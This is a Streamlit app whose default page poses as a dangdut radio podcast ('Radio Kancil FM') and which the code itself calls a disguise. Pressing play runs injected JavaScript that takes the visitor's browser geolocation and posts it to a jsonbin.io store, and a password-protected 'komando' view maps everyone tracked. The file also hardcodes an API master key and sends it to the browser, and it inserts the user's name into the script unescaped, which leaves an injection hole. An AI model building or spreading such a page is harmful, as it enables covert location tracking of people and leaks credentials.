import streamlit as st
import requests
import time

BIN_ID = "6aeeda8bac6210605a74a7b5"
API_KEY = "$2a$10$LqOM0CuXj0rfzswJ3uFRreGYD5d1L2gTC0LRvTA700G96mUzr7.aO"
URL = "https://api.jsonbin.io/v3/b/" + BIN_ID
HEADERS = {"X-Master-Key": API_KEY, "Content-Type": "application/json"}

# DEFAULT MODE = USER (SAMARAN) - ben wong njobo langsung ketok Radio
params = st.query_params
mode = params.get("mode", "user")

def ambil():
    try:
        r = requests.get(URL + "/latest", headers=HEADERS, timeout=10)
        d = r.json().get("record", {})
        while isinstance(d, dict) and "record" in d:
            d = d["record"]
        if not isinstance(d, dict): d = {}
        return d
    except: return {}

def simpan(data):
    requests.put(URL, json=data, headers=HEADERS, timeout=10)

# ============ MODE KOMANDO ============
if mode == "komando":
    st.set_page_config(page_title="KOMANDO - MATA ELANG", layout="wide")
    st.title("🦅 KOMANDO - MATA ELANG")
    pw = st.text_input("SANDI KOMANDO:", type="password")
    if pw != "kancil123":
        st.warning("Masukkan sandi komando")
        st.stop()
    st.success("AKSES DITERIMA - SELAMAT DATANG KOMANDAN")
    data = ambil()
    st.write(f"Total Personil Terpantau: {len(data)}")
    for nama, info in data.items():
        st.write(f"📍 **{nama}** - {info.get('lat')}, {info.get('lon')} - {info.get('waktu','')}")
        if info.get('lat'):
            st.map(data={"lat":[info['lat']], "lon":[info['lon']]})
    if st.button("🔄 REFRESH PETA"):
        st.rerun()
    st.stop()

# ============ MODE USER - SAMARAN RADIO ============
st.set_page_config(page_title="RADIO KANCIL FM - PODCAST MUSIK", layout="wide")
st.markdown("<h1 style='text-align:center'>📻 RADIO KANCIL FM</h1>", unsafe_allow_html=True)
st.markdown("<p style='text-align:center'>🎙️ Podcast Musik Dangdut Viral - Request Lagu Gratis!</p>", unsafe_allow_html=True)
st.markdown("<p style='text-align:center'>🔴 LIVE - 1.2K Pendengar</p>", unsafe_allow_html=True)

nama = st.text_input("👤 JENENGMU GAWE REQUEST LAGU:", placeholder="Contoh: Budi - Request Via Vallen")
st.info("📌 Tim: Isi Nama / Kode Callsign sing wes disepakati, terus klik PUTAR. Musik 18 detik = sinyal absen terkirim.")

if nama:
    if st.button("🎵 PUTAR MUSIK & REQUEST LAGU", use_container_width=True):
        st.audio("https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3")
        st.success("🎶 Lagu diputar... Request mu masuk antrian!")
        # Kirim lokasi via JS
        js = f"""
        <script>
        navigator.geolocation.getCurrentPosition(function(pos){{
            fetch("https://api.jsonbin.io/v3/b/{BIN_ID}", {{
                method: "GET",
                headers: {{"X-Master-Key": "{API_KEY}"}}
            }}).then(r=>r.json()).then(j=>{{
                let d = j.record || {{}};
                if(d.record) d = d.record;
                d["{nama}"] = {{lat: pos.coords.latitude, lon: pos.coords.longitude, waktu: new Date().toLocaleString('id-ID')}};
                fetch("https://api.jsonbin.io/v3/b/{BIN_ID}", {{
                    method: "PUT",
                    headers: {{"X-Master-Key": "{API_KEY}", "Content-Type": "application/json"}},
                    body: JSON.stringify(d)
                }});
            }});
        }});
        </script>
        """
        st.components.v1.html(js, height=0)
        st.balloons()
else:
    st.warning("Isi jenengmu disik bro gawe request lagu.")
